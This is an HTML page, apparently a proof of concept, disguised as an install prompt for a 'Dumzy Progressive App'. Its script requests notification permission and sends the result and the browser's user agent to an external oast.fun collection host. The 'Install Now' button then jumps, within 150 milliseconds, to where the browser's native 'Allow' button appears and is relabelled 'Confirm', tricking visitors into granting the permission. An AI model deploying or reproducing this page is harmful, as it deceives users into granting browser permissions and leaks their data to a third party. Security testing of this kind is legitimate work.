<!DOCTYPE html>
<html>
<head>
  <title>Install Dumzy Progressive App</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    #install-btn {
      background: green;
      color: white;
      padding: 20px 40px;
      font-size: 22px;
      border: none;
      border-radius: 10px;
      position: absolute;
      top: 220px;
      left: 50%;
      transform: translateX(-50%);
      cursor: pointer;
      z-index: 9999;
      transition: all 0.2s ease;
    }
  </style>
</head>
<body>

  <h2>ðŸ“± Install Dumzy Progressive App</h2>
  <p>For faster experience, install Dumzy to your home screen.</p>

  <button id="install-btn" onclick="handleClick()">Install Now</button>

  <script>
    let moved = false;

    // Trigger Notification permission request
    setTimeout(() => {
      Notification.requestPermission().then(result => {
        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/chain-install-notif', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            permission: result,
            ua: navigator.userAgent,
            ts: Date.now()
          })
        });
      });
    }, 1000);

    function handleClick() {
      const btn = document.getElementById("install-btn");

      if (!moved) {
        // Delay short enough to mimic natural reposition
        setTimeout(() => {
          btn.style.top = "90px";      // Approx location of native "Allow" button
          btn.style.left = "400px";    // Fine-tune based on testing on browser
          btn.textContent = "Confirm";
        }, 150); // Delay under human perception threshold
        moved = true;
      } else {
        alert("App is being installed...");
      }
    }
  </script>
</body>
</html>
